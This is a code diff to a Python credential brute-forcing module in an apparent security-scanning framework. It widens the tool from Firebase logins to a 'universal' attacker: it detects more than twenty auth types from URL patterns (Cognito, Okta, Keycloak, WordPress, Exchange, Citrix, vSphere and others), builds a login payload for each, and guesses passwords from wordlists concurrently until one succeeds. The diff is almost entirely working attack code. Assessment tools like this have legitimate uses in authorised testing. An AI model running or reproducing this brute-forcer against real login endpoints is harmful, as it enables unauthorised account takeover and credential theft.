@@ -9,10 +9,12 @@ import urllib.error
 import urllib.parse
 import base64
 import re
+import hashlib
+import hmac
 
 
 class CredentialTester(BaseModule):
-    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""
+    """Universal brute force module - supports 20+ authentication types"""
 
     def __init__(self, config, stealth=None, db=None, graph_manager=None):
         super().__init__(config, stealth, db, graph_manager)
@@ -51,15 +53,22 @@ class CredentialTester(BaseModule):
 
         print(f"\033[96m[*] Target URL: {target_url}\033[0m")
 
+        # Detect auth type from URL patterns
+        auth_type = self._detect_auth_type(target_url)
+        
         if 'identitytoolkit.googleapis.com' in target_url:
             print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
             endpoint = {
                 'url': target_url,
-                'form_type': 'firebase',
-                'fields': {
-                    'username_fields': ['email'],
-                    'password_field': 'password'
-                }
+                'auth_type': 'firebase',
+                'fields': {'username_fields': ['email'], 'password_field': 'password'}
+            }
+        elif auth_type:
+            print(f"\033[92m[+] Detected auth type: {auth_type}\033[0m")
+            endpoint = {
+                'url': target_url,
+                'auth_type': auth_type,
+                'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
             }
         else:
             print(f"\033[96m[*] Attempting to extract Firebase config...\033[0m")
@@ -69,21 +78,15 @@ class CredentialTester(BaseModule):
                 print(f"\033[92m[+] Firebase endpoint found: {firebase_url}\033[0m")
                 endpoint = {
                     'url': firebase_url,
-                    'form_type': 'firebase',
-                    'fields': {
-                        'username_fields': ['email'],
-                        'password_field': 'password'
-                    }
+                    'auth_type': 'firebase',
+                    'fields': {'username_fields': ['email'], 'password_field': 'password'}
                 }
             else:
-                print(f"\033[93m[!] Could not extract Firebase config, trying direct brute force\033[0m")
+                print(f"\033[93m[!] No specific auth type detected, trying universal brute force\033[0m")
                 endpoint = {
                     'url': target_url,
-                    'form_type': 'auto',
-                    'fields': {
-                        'username_fields': ['email', 'username', 'user', 'login'],
-                        'password_field': 'password'
-                    }
+                    'auth_type': 'universal',
+                    'fields': {'username_fields': ['email', 'username', 'user', 'login'], 'password_field': 'password'}
                 }
 
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
@@ -93,6 +96,40 @@ class CredentialTester(BaseModule):
 
         await self._test_brute_force(endpoint)
         return self.findings
+
+    def _detect_auth_type(self, url: str) -> Optional[str]:
+        """Detect authentication type from URL patterns"""
+        url_lower = url.lower()
+        
+        patterns = {
+            'firebase': ['identitytoolkit', 'firebaseapp', 'web.app'],
+            'aws_cognito': ['cognito', 'amazoncognito', 'aws.amazon.com'],
+            'auth0': ['auth0.com', 'auth0'],
+            'okta': ['okta.com', 'oktapreview', 'okta-emea'],
+            'keycloak': ['keycloak', 'auth/realms'],
+            'ldap': ['ldap', 'ldaps', '389', '636'],
+            'saml': ['saml', 'saml2', 'adfs', 'shibboleth'],
+            'jwt': ['/jwt', '/token', 'api/token', 'auth/token'],
+            'oauth2': ['/oauth', '/oauth2', 'authorize', 'access_token'],
+            'graphql': ['/graphql', '/gql', 'api/graphql'],
+            'wordpress': ['wp-login', 'wp-admin', 'wordpress'],
+            'drupal': ['/user/login', 'drupal'],
+            'joomla': ['/administrator', 'joomla'],
+            'django': ['/admin', 'django', 'csrfmiddlewaretoken'],
+            'rails': ['/users/sign_in', 'authenticity_token'],
+            'spring': ['/login', 'spring-security', 'j_spring_security_check'],
+            'sap': ['/sap', 'sap-system-login'],
+            'sharepoint': ['sharepoint', '_layouts/authenticate'],
+            'exchange': ['/owa', 'exchange', 'outlook'],
+            'citrix': ['/citrix', 'nfauth'],
+            'vmware': ['/ui', 'vmware', 'vsphere'],
+        }
+        
+        for auth_type, keywords in patterns.items():
+            if any(kw in url_lower for kw in keywords):
+                return auth_type
+        
+        return None
 
     async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
         try:
@@ -220,11 +257,277 @@ class CredentialTester(BaseModule):
         print()
         return usernames, passwords
 
+    def _build_payload(self, auth_type: str, username: str, password: str, url: str) -> Dict:
+        """Build request payload based on auth type"""
+        result = {
+            'url': url,
+            'method': 'POST',
+            'headers': {},
+            'data': None,
+            'use_json': False,
+            'use_basic_auth': False,
+            'basic_auth_tuple': None
+        }
+
+        # Firebase / Google Identity Toolkit
+        if auth_type == 'firebase':
+            result['data'] = {
+                'email': username,
+                'password': password,
+                'returnSecureToken': True
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        # AWS Cognito
+        elif auth_type == 'aws_cognito':
+            result['data'] = {
+                'AuthFlow': 'USER_PASSWORD_AUTH',
+                'ClientId': self._extract_cognito_client_id(url),
+                'AuthParameters': {
+                    'USERNAME': username,
+                    'PASSWORD': password
+                }
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/x-amz-json-1.1'
+            result['headers']['X-Amz-Target'] = 'AWSCognitoIdentityProviderService.InitiateAuth'
+
+        # Auth0
+        elif auth_type == 'auth0':
+            result['data'] = {
+                'grant_type': 'password',
+                'username': username,
+                'password': password,
+                'audience': url,
+                'scope': 'openid profile'
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        # Okta
+        elif auth_type == 'okta':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'options': {
+                    'multiOptionalFactorEnroll': False,
+                    'warnBeforePasswordExpired': False
+                }
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+            result['headers']['Accept'] = 'application/json'
+
+        # Keycloak
+        elif auth_type == 'keycloak':
+            result['data'] = {
+                'grant_type': 'password',
+                'client_id': 'admin-cli',
+                'username': username,
+                'password': password
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # LDAP (via HTTP proxy/gateway)
+        elif auth_type == 'ldap':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'auth_type': 'ldap'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # SAML (simplified)
+        elif auth_type == 'saml':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'SAMLRequest': 'placeholder'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # JWT / Token endpoint
+        elif auth_type == 'jwt':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'grant_type': 'password'
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        # OAuth2
+        elif auth_type == 'oauth2':
+            result['data'] = {
+                'grant_type': 'password',
+                'username': username,
+                'password': password,
+                'scope': 'read write'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # GraphQL
+        elif auth_type == 'graphql':
+            mutation = f'mutation {{ login(input: {{email: "{username}", password: "{password}"}}) {{ token user {{ id email }} }} }}'
+            result['data'] = {'query': mutation}
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        # WordPress
+        elif auth_type == 'wordpress':
+            result['data'] = {
+                'log': username,
+                'pwd': password,
+                'wp-submit': 'Log In',
+                'redirect_to': '/wp-admin/',
+                'testcookie': '1'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+            result['headers']['Cookie'] = 'wordpress_test_cookie=WP+Cookie+check'
+
+        # Drupal
+        elif auth_type == 'drupal':
+            result['data'] = {
+                'name': username,
+                'pass': password,
+                'form_id': 'user_login_form',
+                'op': 'Log in'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Joomla
+        elif auth_type == 'joomla':
+            result['data'] = {
+                'username': username,
+                'passwd': password,
+                'task': 'login',
+                'option': 'com_users'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Django
+        elif auth_type == 'django':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'csrfmiddlewaretoken': 'placeholder'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Ruby on Rails
+        elif auth_type == 'rails':
+            result['data'] = {
+                'user[email]': username,
+                'user[password]': password,
+                'authenticity_token': 'placeholder'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Spring Security
+        elif auth_type == 'spring':
+            result['data'] = {
+                'j_username': username,
+                'j_password': password,
+                'submit': 'Login'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # SAP
+        elif auth_type == 'sap':
+            result['data'] = {
+                'j_user': username,
+                'j_password': password,
+                'sap-system-login': 'on'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # SharePoint
+        elif auth_type == 'sharepoint':
+            result['data'] = {
+                'ctl00$PlaceHolderMain$signInControl$UserName': username,
+                'ctl00$PlaceHolderMain$signInControl$Password': password
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Exchange / OWA
+        elif auth_type == 'exchange':
+            result['data'] = {
+                'username': username,
+                'password': password,
+                'trusted': '4'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # Citrix
+        elif auth_type == 'citrix':
+            result['data'] = {
+                'login': username,
+                'passwd': password,
+                'nsg-user-login': 'true'
+            }
+            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+
+        # VMware vSphere
+        elif auth_type == 'vmware':
+            result['data'] = {
+                'userName': username,
+                'password': password
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        # Basic Auth
+        elif auth_type == 'basic_auth':
+            result['use_basic_auth'] = True
+            result['basic_auth_tuple'] = (username, password)
+            result['method'] = 'GET'
+
+        # Digest Auth
+        elif auth_type == 'digest_auth':
+            result['use_basic_auth'] = True  # urllib handles both
+            result['basic_auth_tuple'] = (username, password)
+            result['method'] = 'GET'
+
+        # XML/SOAP
+        elif auth_type == 'xml_soap':
+            result['data'] = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <Login xmlns="http://tempuri.org/">
+      <username>{username}</username>
+      <password>{password}</password>
+    </Login>
+  </soap:Body>
+</soap:Envelope>'''
+            result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
+            result['headers']['SOAPAction'] = '"Login"'
+
+        # Default / Universal
+        else:
+            # Try multiple common formats
+            result['data'] = {
+                'email': username,
+                'password': password
+            }
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
+        return result
+
+    def _extract_cognito_client_id(self, url: str) -> str:
+        """Extract AWS Cognito Client ID from URL or return placeholder"""
+        # Try to extract from URL pattern
+        match = re.search(r'client_id=([a-z0-9]+)', url, re.IGNORECASE)
+        if match:
+            return match.group(1)
+        return 'PLACEHOLDER_CLIENT_ID'
+
     async def _test_brute_force(self, endpoint: Dict):
         import itertools
 
         url = endpoint['url']
-        form_type = endpoint.get('form_type', 'auto')
+        auth_type = endpoint.get('auth_type', 'universal')
         fields = endpoint.get('fields', {})
         
         base_usernames, passwords = self._load_wordlists()
@@ -236,7 +539,7 @@ class CredentialTester(BaseModule):
         rate_limited = [False]
         counter = [0]
 
-        print(f"\033[96m[*] Form Type : {form_type}\033[0m")
+        print(f"\033[96m[*] Auth Type : {auth_type}\033[0m")
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
         print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")
@@ -251,104 +554,47 @@ class CredentialTester(BaseModule):
                     loop = asyncio.get_event_loop()
 
                     def do_request():
-                        if form_type == 'firebase' or 'identitytoolkit' in url:
-                            body = json.dumps({
-                                'email': username,
-                                'password': password,
-                                'returnSecureToken': True
-                            }).encode('utf-8')
-                            req = urllib.request.Request(
-                                url,
-                                data=body,
-                                headers={
-                                    'Content-Type': 'application/json',
-                                    'User-Agent': 'Mozilla/5.0'
-                                },
-                                method='POST'
-                            )
-                            try:
-                                with urllib.request.urlopen(req, timeout=15) as r:
-                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'firebase'
-                            except urllib.error.HTTPError as e:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'firebase'
-                            except Exception as e:
-                                return 0, str(e), {}, 'firebase'
+                        # Build payload for this auth type
+                        config = self._build_payload(auth_type, username, password, url)
                         
-                        else:
-                            try:
-                                body = json.dumps({
-                                    'email': username,
-                                    'password': password
-                                }).encode('utf-8')
+                        try:
+                            if config.get('use_basic_auth'):
+                                # Basic/Digest Auth
+                                auth_str = base64.b64encode(
+                                    f"{config['basic_auth_tuple'][0]}:{config['basic_auth_tuple'][1]}".encode()
+                                ).decode()
                                 req = urllib.request.Request(
-                                    url,
+                                    config['url'],
+                                    headers={
+                                        'Authorization': f'Basic {auth_str}',
+                                        'User-Agent': 'Mozilla/5.0'
+                                    },
+                                    method=config['method']
+                                )
+                                with urllib.request.urlopen(req, timeout=15) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), auth_type
+                            
+                            else:
+                                # POST requests
+                                data = config['data']
+                                if config.get('use_json'):
+                                    body = json.dumps(data).encode('utf-8')
+                                else:
+                                    body = urllib.parse.urlencode(data).encode('utf-8')
+                                
+                                req = urllib.request.Request(
+                                    config['url'],
                                     data=body,
-                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
-                                    method='POST'
+                                    headers={**config['headers'], 'User-Agent': 'Mozilla/5.0'},
+                                    method=config['method']
                                 )
-                                with urllib.request.urlopen(req, timeout=10) as r:
-                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
-                            except urllib.error.HTTPError as e:
-                                if e.code not in [400, 401, 403]:
-                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
-                            except Exception:
-                                pass
-
-                            try:
-                                body = json.dumps({
-                                    'username': username,
-                                    'password': password
-                                }).encode('utf-8')
-                                req = urllib.request.Request(
-                                    url,
-                                    data=body,
-                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
-                                    method='POST'
-                                )
-                                with urllib.request.urlopen(req, timeout=10) as r:
-                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
-                            except urllib.error.HTTPError as e:
-                                if e.code not in [400, 401, 403]:
-                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
-                            except Exception:
-                                pass
-
-                            try:
-                                data = urllib.parse.urlencode({
-                                    'email': username,
-                                    'password': password
-                                }).encode('utf-8')
-                                req = urllib.request.Request(
-                                    url,
-                                    data=data,
-                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
-                                    method='POST'
-                                )
-                                with urllib.request.urlopen(req, timeout=10) as r:
-                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
-                            except urllib.error.HTTPError as e:
-                                if e.code not in [400, 401, 403]:
-                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
-                            except Exception:
-                                pass
-
-                            try:
-                                data = urllib.parse.urlencode({
-                                    'username': username,
-                                    'password': password
-                                }).encode('utf-8')
-                                req = urllib.request.Request(
-                                    url,
-                                    data=data,
-                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
-                                    method='POST'
-                                )
-                                with urllib.request.urlopen(req, timeout=10) as r:
-                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
-                            except urllib.error.HTTPError as e:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
-                            except Exception as e:
-                                return 0, str(e), {}, 'unknown'
+                                with urllib.request.urlopen(req, timeout=15) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), auth_type
+                                    
+                        except urllib.error.HTTPError as e:
+                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), auth_type
+                        except Exception as ex:
+                            return 0, str(ex), {}, auth_type
 
                     status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                     tl = text.lower()
@@ -368,26 +614,56 @@ class CredentialTester(BaseModule):
 
                     is_success = False
 
-                    if used_format == 'firebase':
+                    # Auth-specific success detection
+                    if auth_type == 'firebase':
                         if 'idtoken' in tl or 'id_token' in tl:
                             if not any(err in tl for err in ['invalid', 'error', 'failed']):
                                 is_success = True
                         elif 'registered' in tl and 'true' in tl:
                             is_success = True
                     
-                    elif any(k in tl for k in ['token', 'access_token', 'session', 'success']):
-                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied']):
+                    elif auth_type == 'aws_cognito':
+                        if 'accessToken' in tl or 'idToken' in tl or 'AuthenticationResult' in tl:
                             is_success = True
                     
+                    elif auth_type == 'auth0':
+                        if 'access_token' in tl or 'id_token' in tl:
+                            is_success = True
+                    
+                    elif auth_type == 'okta':
+                        if 'sessionToken' in tl or 'status' in tl and 'success' in tl:
+                            is_success = True
+                    
+                    elif auth_type == 'jwt' or auth_type == 'oauth2':
+                        if 'access_token' in tl or 'token' in tl:
+                            if not any(err in tl for err in ['invalid', 'error', 'unauthorized']):
+                                is_success = True
+                    
+                    elif auth_type == 'wordpress':
+                        if status in [301, 302] and 'wp-admin' in resp_headers.get('Location', '').lower():
+                            is_success = True
+                        if 'dashboard' in tl or 'wp-admin' in tl:
+                            is_success = True
+                    
+                    elif auth_type == 'basic_auth' or auth_type == 'digest_auth':
+                        if status == 200:
+                            is_success = True
+                    
+                    # Universal success indicators
+                    elif any(k in tl for k in ['token', 'access_token', 'session', 'authenticated', 'success', 'welcome', 'dashboard']):
+                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied', 'unauthorized']):
+                            is_success = True
+                    
+                    # Redirect to non-login page
                     if status in [301, 302, 303]:
                         location = resp_headers.get('Location', '').lower()
-                        if location and not any(p in location for p in ['login', 'error', 'fail']):
+                        if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
                             is_success = True
 
                     if is_success:
                         sys.stdout.write('\n')
                         self._report_success(username, password, url, counter[0],
-                                             [used_format], 'password')
+                                             [auth_type], 'password')
                         found_event.set()
 
                 except asyncio.CancelledError:
@@ -426,7 +702,7 @@ class CredentialTester(BaseModule):
             severity='Critical',
             description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
             evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
-            poc=f"curl -X POST '{url}' -d 'email={username}&password={password}'",
+            poc=f"curl -X POST '{url}' -d 'username={username}&password={password}'",
             remediation='Implement strong password policy, rate limiting, and account lockout',
             cvss_score=9.8, bounty_score=5000, target=url))
 
